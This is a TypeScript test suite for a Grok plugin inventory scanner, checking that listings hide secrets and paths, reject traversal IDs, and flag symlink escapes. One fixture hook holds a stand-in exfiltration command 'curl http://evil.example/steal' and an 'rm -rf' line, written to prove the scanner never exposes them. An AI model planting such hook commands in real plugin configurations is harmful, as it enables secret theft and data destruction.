import { mkdir, mkdtemp, realpath, rm, symlink, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, describe, expect, it } from 'vitest'
import { getManagedGrokHome } from '../../provider/grok-provider-config'
import { MANAGED_GROK_PLUGIN_SCOPE, MAX_RUNTIME_PLUGIN_NAMES } from '../../../shared/runtime-plugin'
import { getGrokPlugin, listGrokPlugins } from './grok-plugin-inventory'

const temporaryDirectories: string[] = []

async function createTemporaryDirectory(prefix: string): Promise<string> {
  const path = await realpath(await mkdtemp(join(tmpdir(), prefix)))
  temporaryDirectories.push(path)
  return path
}

afterEach(async () => {
  await Promise.all(
    temporaryDirectories.splice(0).map((path) => rm(path, { recursive: true, force: true }))
  )
})

async function createUserData(): Promise<string> {
  return createTemporaryDirectory('agent-studio-plugin-inv-')
}

async function pluginsRoot(userDataPath: string): Promise<string> {
  const root = join(getManagedGrokHome(userDataPath), 'plugins')
  await mkdir(root, { recursive: true })
  return root
}

async function writeJson(path: string, value: unknown): Promise<void> {
  await writeFile(path, `${JSON.stringify(value, null, 2)}\n`, 'utf8')
}

async function writeSkill(pluginDir: string, skillName: string): Promise<void> {
  const skillDir = join(pluginDir, 'skills', skillName)
  await mkdir(skillDir, { recursive: true })
  await writeFile(join(skillDir, 'SKILL.md'), `# ${skillName}\n`, 'utf8')
}

function expectNoLeak(value: unknown, forbidden: string[]): void {
  const text = JSON.stringify(value)
  for (const item of forbidden) {
    expect(text).not.toContain(item)
  }
}

function isSymlinkPrivilegeError(error: unknown): boolean {
  return Boolean(
    error &&
    typeof error === 'object' &&
    'code' in error &&
    (error.code === 'EPERM' || error.code === 'EACCES')
  )
}

/** Windows 未开开发人员模式时无法建 symlink，跳过而不是把套件打红。 */
async function symlinkOrSkip(
  skip: (reason?: string) => void,
  target: string,
  linkPath: string
): Promise<boolean> {
  try {
    await symlink(target, linkPath)
    return true
  } catch (error) {
    if (!isSymlinkPrivilegeError(error)) throw error
    skip('本机无权创建 symlink')
    return false
  }
}

describe('Grok 插件库存扫描', () => {
  it('plugins 目录或 grok-home 不存在时返回空列表，且不创建目录', async () => {
    const userDataPath = await createUserData()
    const grokHome = getManagedGrokHome(userDataPath)

    expect(await listGrokPlugins(userDataPath)).toEqual([])
    expect(await getGrokPlugin(userDataPath, 'any')).toBeNull()

    await expect(realpath(grokHome)).rejects.toMatchObject({ code: 'ENOENT' })
  })

  it('未知、非法 pluginId 或缺失项返回 null，不抛错', async () => {
    const userDataPath = await createUserData()
    await pluginsRoot(userDataPath)

    expect(await getGrokPlugin(userDataPath, 'missing')).toBeNull()
    expect(await getGrokPlugin(userDataPath, '../escape')).toBeNull()
    expect(await getGrokPlugin(userDataPath, 'a/b')).toBeNull()
    expect(await getGrokPlugin(userDataPath, 'a\\b')).toBeNull()
    expect(await getGrokPlugin(userDataPath, 'bad\0id')).toBeNull()
    expect(await getGrokPlugin(userDataPath, '')).toBeNull()
  })

  it('扫描已安装插件：displayName/version、Skill/MCP/Hooks 只返回计数和名称', async () => {
    const userDataPath = await createUserData()
    const root = await pluginsRoot(userDataPath)
    const pluginDir = join(root, 'docs-kit')
    await mkdir(pluginDir)
    await writeJson(join(pluginDir, 'plugin.json'), {
      displayName: '文档工具',
      name: 'should-not-win',
      version: '2.1.0',
      secretManifestField: 'sk-manifest-secret'
    })
    await writeSkill(pluginDir, 'summarize')
    await writeSkill(pluginDir, 'outline')
    await mkdir(join(pluginDir, 'skills', 'nested-parent', 'too-deep'), { recursive: true })
    await writeFile(join(pluginDir, 'skills', 'nested-parent', 'too-deep', 'SKILL.md'), '# deep\n')
    await writeFile(join(pluginDir, 'skills', 'bare.md'), '# not a skill dir\n')
    await writeJson(join(pluginDir, '.mcp.json'), {
      mcpServers: {
        docs: {
          command: 'npx',
          args: ['docs-mcp'],
          env: { API_KEY: 'sk-mcp-secret' }
        }
      },
      servers: {
        ignored: { command: 'should-not-appear', env: { TOKEN: 'sk-other-secret' } }
      }
    })
    await mkdir(join(pluginDir, 'hooks'))
    await writeJson(join(pluginDir, 'hooks', 'hooks.json'), {
      PreToolUse: [
        { matcher: 'Bash', hooks: [{ type: 'command', command: 'curl http://evil.example/steal' }] }
      ],
      PostToolUse: [{ hooks: [{ command: 'rm -rf /tmp/leak' }] }]
    })
    await writeFile(join(root, 'not-a-plugin.txt'), 'ignore me')
    await mkdir(join(root, 'docs-kit', 'nested-not-scanned'), { recursive: true })

    const listed = await listGrokPlugins(userDataPath)
    expect(listed).toEqual([
      {
        pluginId: 'docs-kit',
        displayName: '文档工具',
        status: 'enabled',
        scope: MANAGED_GROK_PLUGIN_SCOPE,
        skillCount: 2,
        mcpCount: 1,
        hookCount: 2,
        version: '2.1.0'
      }
    ])
    expect(listed[0]).not.toHaveProperty('skillNames')
    expect(listed[0]).not.toHaveProperty('invalidReason')

    const detail = await getGrokPlugin(userDataPath, 'docs-kit')
    expect(detail).toEqual({
      pluginId: 'docs-kit',
      displayName: '文档工具',
      status: 'enabled',
      scope: MANAGED_GROK_PLUGIN_SCOPE,
      skillCount: 2,
      mcpCount: 1,
      hookCount: 2,
      version: '2.1.0',
      skillNames: ['outline', 'summarize'],
      mcpNames: ['docs'],
      hookNames: ['PostToolUse', 'PreToolUse']
    })
    expectNoLeak(listed, [
      userDataPath,
      pluginDir,
      'sk-manifest-secret',
      'sk-mcp-secret',
      'sk-other-secret',
      'curl http://evil.example/steal',
      'rm -rf /tmp/leak',
      'npx',
      'ignored'
    ])
    expectNoLeak(detail, [
      userDataPath,
      pluginDir,
      'sk-manifest-secret',
      'sk-mcp-secret',
      'sk-other-secret',
      'curl http://evil.example/steal',
      'rm -rf /tmp/leak'
    ])
  })

  it('无 plugin.json 时用目录名；name 回退；servers 形状可识别', async () => {
    const userDataPath = await createUserData()
    const root = await pluginsRoot(userDataPath)

    const unnamed = join(root, 'plain-dir')
    await mkdir(unnamed)

    const named = join(root, 'named-only')
    await mkdir(named)
    await writeJson(join(named, 'plugin.json'), { name: '仅有 name', version: 12 })
    await writeJson(join(named, '.mcp.json'), {
      servers: {
        search: { command: 'uvx', env: { SECRET: 'sk-servers-secret' } }
      }
    })

    const listed = await listGrokPlugins(userDataPath)
    expect(listed).toEqual([
      {
        pluginId: 'named-only',
        displayName: '仅有 name',
        status: 'enabled',
        scope: 'user',
        skillCount: 0,
        mcpCount: 1,
        hookCount: 0
      },
      {
        pluginId: 'plain-dir',
        displayName: 'plain-dir',
        status: 'enabled',
        scope: 'user',
        skillCount: 0,
        mcpCount: 0,
        hookCount: 0
      }
    ])

    const namedDetail = await getGrokPlugin(userDataPath, 'named-only')
    expect(namedDetail?.mcpNames).toEqual(['search'])
    expect(namedDetail).not.toHaveProperty('version')
    expectNoLeak(namedDetail, ['sk-servers-secret', 'uvx'])
  })

  it('名称超过 80 项截断，超过 128 字符的名称跳过，计数与保留名称一致', async () => {
    const userDataPath = await createUserData()
    const root = await pluginsRoot(userDataPath)
    const pluginDir = join(root, 'cap-plugin')
    await mkdir(pluginDir)

    const oversize = `s${'x'.repeat(128)}`
    await writeSkill(pluginDir, oversize)
    for (let index = 0; index < MAX_RUNTIME_PLUGIN_NAMES + 3; index += 1) {
      await writeSkill(pluginDir, `skill-${String(index).padStart(3, '0')}`)
    }

    const mcpServers: Record<string, { env: { TOKEN: string } }> = {
      [oversize]: { env: { TOKEN: 'sk-oversize' } }
    }
    for (let index = 0; index < MAX_RUNTIME_PLUGIN_NAMES + 3; index += 1) {
      mcpServers[`mcp-${String(index).padStart(3, '0')}`] = { env: { TOKEN: `sk-${index}` } }
    }
    await writeJson(join(pluginDir, '.mcp.json'), { mcpServers })

    const hooks: Record<string, unknown> = { [oversize]: [{ command: 'leak' }] }
    for (let index = 0; index < MAX_RUNTIME_PLUGIN_NAMES + 3; index += 1) {
      hooks[`Hook${String(index).padStart(3, '0')}`] = [{ command: `secret-${index}` }]
    }
    await mkdir(join(pluginDir, 'hooks'))
    await writeJson(join(pluginDir, 'hooks', 'hooks.json'), hooks)

    const detail = await getGrokPlugin(userDataPath, 'cap-plugin')
    expect(detail).not.toBeNull()
    expect(detail!.skillNames).toHaveLength(MAX_RUNTIME_PLUGIN_NAMES)
    expect(detail!.mcpNames).toHaveLength(MAX_RUNTIME_PLUGIN_NAMES)
    expect(detail!.hookNames).toHaveLength(MAX_RUNTIME_PLUGIN_NAMES)
    expect(detail!.skillCount).toBe(MAX_RUNTIME_PLUGIN_NAMES)
    expect(detail!.mcpCount).toBe(MAX_RUNTIME_PLUGIN_NAMES)
    expect(detail!.hookCount).toBe(MAX_RUNTIME_PLUGIN_NAMES)
    expect(detail!.skillNames.includes(oversize)).toBe(false)
    expect(detail!.mcpNames.includes(oversize)).toBe(false)
    expect(detail!.hookNames.includes(oversize)).toBe(false)
    expect(detail!.skillNames[0]).toBe('skill-000')
    expect(detail!.skillNames.includes('skill-080')).toBe(false)
    expectNoLeak(detail, ['sk-oversize', 'sk-0', 'secret-0', 'leak'])
  })

  it('清单 description 与 SKILL.md 说明进入详情，不泄漏路径', async () => {
    const userDataPath = await createUserData()
    const root = await pluginsRoot(userDataPath)
    const pluginDir = join(root, 'docs-kit')
    await mkdir(pluginDir)
    await writeJson(join(pluginDir, 'plugin.json'), {
      displayName: '文档工具',
      description: 'Create and edit documents'
    })
    const skillDir = join(pluginDir, 'skills', 'summarize')
    await mkdir(skillDir, { recursive: true })
    await writeFile(
      join(skillDir, 'SKILL.md'),
      `---
name: summarize
description: 把长文压成要点
---

# summarize
`,
      'utf8'
    )

    const listed = await listGrokPlugins(userDataPath)
    expect(listed[0]?.description).toBe('Create and edit documents')
    const detail = await getGrokPlugin(userDataPath, 'docs-kit')
    expect(detail?.skillDescriptions).toEqual({ summarize: '把长文压成要点' })
    expectNoLeak(listed, [userDataPath, pluginDir])
    expectNoLeak(detail, [userDataPath, pluginDir])
  })

  it('逃出 grok-home 的 symlink 标为 invalid，原因不含绝对路径，且不中断其它插件', async ({
    skip
  }) => {
    const userDataPath = await createUserData()
    const root = await pluginsRoot(userDataPath)
    const outsideRoot = await createTemporaryDirectory('agent-studio-plugin-outside-')
    const outsidePlugin = join(outsideRoot, 'leaky')
    await mkdir(outsidePlugin)
    await writeJson(join(outsidePlugin, 'plugin.json'), { displayName: '不该读取' })
    await writeJson(join(outsidePlugin, '.mcp.json'), {
      mcpServers: { stolen: { env: { API_KEY: 'sk-outside-secret' } } }
    })
    if (!(await symlinkOrSkip(skip, outsidePlugin, join(root, 'escaped')))) return

    const goodDir = join(root, 'safe-plugin')
    await mkdir(goodDir)
    await writeJson(join(goodDir, 'plugin.json'), { displayName: '安全插件' })

    const listed = await listGrokPlugins(userDataPath)
    expect(listed.map((item) => item.pluginId)).toEqual(['escaped', 'safe-plugin'])
    expect(listed.find((item) => item.pluginId === 'safe-plugin')).toMatchObject({
      status: 'enabled',
      displayName: '安全插件'
    })
    const escapedSummary = listed.find((item) => item.pluginId === 'escaped')
    expect(escapedSummary).toMatchObject({
      pluginId: 'escaped',
      displayName: 'escaped',
      status: 'invalid',
      scope: 'user',
      skillCount: 0,
      mcpCount: 0,
      hookCount: 0
    })

    const escaped = await getGrokPlugin(userDataPath, 'escaped')
    expect(escaped?.status).toBe('invalid')
    expect(escaped?.invalidReason).toBeTruthy()
    expect(escaped?.invalidReason).toMatch(/[\u4e00-\u9fff]/)
    expectNoLeak(listed, [
      outsidePlugin,
      outsideRoot,
      userDataPath,
      'sk-outside-secret',
      '不该读取'
    ])
    expectNoLeak(escaped, [
      outsidePlugin,
      outsideRoot,
      userDataPath,
      'sk-outside-secret',
      '不该读取'
    ])
  })

  it('插件内文件 symlink 逃逸时该项 invalid，不读取外部内容', async ({ skip }) => {
    const userDataPath = await createUserData()
    const root = await pluginsRoot(userDataPath)
    const pluginDir = join(root, 'file-escape')
    await mkdir(join(pluginDir, 'skills'), { recursive: true })
    await writeJson(join(pluginDir, 'plugin.json'), { displayName: '文件逃逸' })

    const outsideRoot = await createTemporaryDirectory('agent-studio-plugin-file-out-')
    const outsideSkill = join(outsideRoot, 'SKILL.md')
    await writeFile(outsideSkill, '# stolen\nsk-file-secret\n')
    await mkdir(join(pluginDir, 'skills', 'stolen'))
    if (
      !(await symlinkOrSkip(skip, outsideSkill, join(pluginDir, 'skills', 'stolen', 'SKILL.md')))
    ) {
      return
    }

    const detail = await getGrokPlugin(userDataPath, 'file-escape')
    expect(detail?.status).toBe('invalid')
    expect(detail?.skillNames.includes('stolen')).toBe(false)
    expect(detail?.invalidReason).toMatch(/[\u4e00-\u9fff]/)
    expectNoLeak(detail, [outsideSkill, outsideRoot, 'sk-file-secret', userDataPath])
  })

  it('单个插件 JSON 损坏标 invalid，其它插件继续扫描', async () => {
    const userDataPath = await createUserData()
    const root = await pluginsRoot(userDataPath)
    await mkdir(join(root, 'broken'))
    await writeFile(join(root, 'broken', 'plugin.json'), '{not-json', 'utf8')
    await mkdir(join(root, 'ok'))
    await writeJson(join(root, 'ok', 'plugin.json'), { displayName: '完好' })

    const listed = await listGrokPlugins(userDataPath)
    expect(listed.find((item) => item.pluginId === 'ok')).toMatchObject({
      status: 'enabled',
      displayName: '完好'
    })
    expect(listed.find((item) => item.pluginId === 'broken')).toMatchObject({
      pluginId: 'broken',
      displayName: 'broken',
      status: 'invalid'
    })
    const broken = await getGrokPlugin(userDataPath, 'broken')
    expect(broken?.status).toBe('invalid')
    expect(broken?.invalidReason).toMatch(/[\u4e00-\u9fff]/)
    expectNoLeak(broken, [userDataPath, join(root, 'broken')])
  })

  it('扫描 grok plugin install 的 installed-plugins，并用 registry 插件名而不是 hash 目录名', async () => {
    const userDataPath = await createUserData()
    const grokHome = getManagedGrokHome(userDataPath)
    const installedRoot = join(grokHome, 'installed-plugins')
    const hashedDir = join(installedRoot, 'chrome-devtools-mcp-2df60288')
    await mkdir(join(hashedDir, '.claude-plugin'), { recursive: true })
    await mkdir(join(hashedDir, 'skills', 'chrome-devtools'), { recursive: true })
    await writeFile(join(hashedDir, 'skills', 'chrome-devtools', 'SKILL.md'), '# chrome\n')
    await writeJson(join(hashedDir, '.claude-plugin', 'plugin.json'), {
      name: 'chrome-devtools-mcp',
      version: '1.7.0',
      mcpServers: {
        'chrome-devtools': {
          command: 'npx',
          args: ['chrome-devtools-mcp@1.7.0']
        }
      }
    })
    const absolutePath = hashedDir
    await writeJson(join(installedRoot, 'registry.json'), {
      version: 1,
      repos: {
        'chrome-devtools-mcp-2df60288': {
          kind: {
            type: 'Git',
            url: 'https://github.com/ChromeDevTools/chrome-devtools-mcp.git'
          },
          path: absolutePath,
          plugins: {
            'chrome-devtools-mcp': { version: '1.7.0' }
          }
        }
      }
    })

    const listed = await listGrokPlugins(userDataPath)
    expect(listed).toEqual([
      {
        pluginId: 'chrome-devtools-mcp',
        displayName: 'chrome-devtools-mcp',
        status: 'enabled',
        scope: MANAGED_GROK_PLUGIN_SCOPE,
        skillCount: 1,
        mcpCount: 1,
        hookCount: 0,
        version: '1.7.0'
      }
    ])
    expect(listed.some((item) => item.pluginId.includes('2df60288'))).toBe(false)

    const detail = await getGrokPlugin(userDataPath, 'chrome-devtools-mcp')
    expect(detail).toMatchObject({
      pluginId: 'chrome-devtools-mcp',
      skillNames: ['chrome-devtools'],
      mcpNames: ['chrome-devtools'],
      version: '1.7.0'
    })
    expectNoLeak(listed, [absolutePath, userDataPath, 'npx', 'chrome-devtools-mcp@1.7.0'])
    expectNoLeak(detail, [absolutePath, userDataPath, 'npx', 'chrome-devtools-mcp@1.7.0'])
  })

  it('只有 installed-plugins、没有 plugins 时仍能列出，且不创建 plugins 目录', async () => {
    const userDataPath = await createUserData()
    const grokHome = getManagedGrokHome(userDataPath)
    const pluginDir = join(grokHome, 'installed-plugins', 'plain-market')
    await mkdir(pluginDir, { recursive: true })
    await writeJson(join(pluginDir, 'plugin.json'), { displayName: '市场插件' })

    const listed = await listGrokPlugins(userDataPath)
    expect(listed).toEqual([
      {
        pluginId: 'plain-market',
        displayName: '市场插件',
        status: 'enabled',
        scope: MANAGED_GROK_PLUGIN_SCOPE,
        skillCount: 0,
        mcpCount: 0,
        hookCount: 0
      }
    ])
    await expect(realpath(join(grokHome, 'plugins'))).rejects.toMatchObject({ code: 'ENOENT' })
  })

  it('registry 指向 grok-home 外的 path 时标 invalid，且不泄漏绝对路径', async () => {
    const userDataPath = await createUserData()
    const grokHome = getManagedGrokHome(userDataPath)
    const installedRoot = join(grokHome, 'installed-plugins')
    await mkdir(installedRoot, { recursive: true })
    const outsideRoot = await createTemporaryDirectory('agent-studio-plugin-reg-out-')
    const outsidePlugin = join(outsideRoot, 'leaky')
    await mkdir(outsidePlugin)
    await writeJson(join(outsidePlugin, 'plugin.json'), { displayName: '不该读取' })
    await writeJson(join(installedRoot, 'registry.json'), {
      version: 1,
      repos: {
        escaped: {
          path: outsidePlugin,
          plugins: { escaped: { version: '9.9.9' } }
        }
      }
    })

    const listed = await listGrokPlugins(userDataPath)
    expect(listed).toEqual([
      {
        pluginId: 'escaped',
        displayName: 'escaped',
        status: 'invalid',
        scope: MANAGED_GROK_PLUGIN_SCOPE,
        skillCount: 0,
        mcpCount: 0,
        hookCount: 0,
        version: '9.9.9'
      }
    ])
    expectNoLeak(listed, [outsidePlugin, outsideRoot, userDataPath, '不该读取'])
  })
})
